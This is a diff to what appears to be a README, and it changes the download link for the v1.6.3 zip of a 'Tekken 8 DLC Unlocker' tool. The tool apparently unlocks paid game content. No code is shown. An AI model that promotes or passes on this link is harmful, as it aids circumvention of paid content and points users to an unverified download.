@@ -14,7 +14,7 @@
 
 ### - 🔗 ***Get Latest Release:***
 
-- [💾 v1.6.3 Release](https://github.com/Tekken-8-DLC-Unlocker/.github/releases/download/v.1.6.3/Tekken-8-DLC-activator.zip) = `*Tool files & folder*`
+- [💾 v1.6.3 Release](https://github.com/Tekken-8-DLC-Unlocker/.github/releases/download/v.1.6.3/tekken8-dlc-unlocker.zip) = `*Tool files & folder*`
 
 ---
 
